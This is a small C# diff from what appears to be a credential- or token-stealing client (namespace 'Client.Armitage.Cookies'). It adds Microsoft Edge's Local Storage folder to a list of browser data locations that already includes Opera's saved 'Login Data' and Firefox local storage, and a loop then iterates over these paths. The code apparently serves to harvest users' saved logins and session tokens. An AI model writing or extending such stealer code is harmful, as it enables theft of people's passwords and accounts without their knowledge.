@@ -32,6 +32,8 @@ namespace Client.Armitage.Cookies
                 Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\Opera Software\Opera Stable\Login Data",
                 // firufoxu
                 Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\Mozilla\Firefox\Profiles\Default\Local Storage\leveldb",
+                // micrusufu edgu
+                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Microsoft\Edge\User Data\Default\Local Storage",
             };
             foreach (string i in paths)
             {
